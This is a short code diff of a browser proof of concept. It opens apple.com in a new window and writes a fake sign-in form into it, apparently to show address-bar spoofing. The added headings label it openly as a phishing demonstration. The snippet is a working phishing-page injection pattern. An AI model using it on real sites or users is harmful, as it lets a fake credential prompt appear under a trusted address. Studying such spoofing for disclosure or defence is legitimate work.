@@ -5,10 +5,12 @@
                 delete window.open;
         }
         w = window.open(&quot;https://www.apple.com&quot;, &quot;_blank&quot;);
-        w.document.write(&quot;Phishing page here  <h1>Sign in to Your Account</h1>
+        w.document.write((` <h1> Phishing Page - Sign in to Your Account</h1>
           <form>
             <input placeholder='Username'><br>
             <input type='password' placeholder='Password'><br>
             <button>Login</button>
-          </form> &quot;);
+          </form>
+          <b></b>
+          <h2>Check the Address Bar</h2>`);
 " /></p>
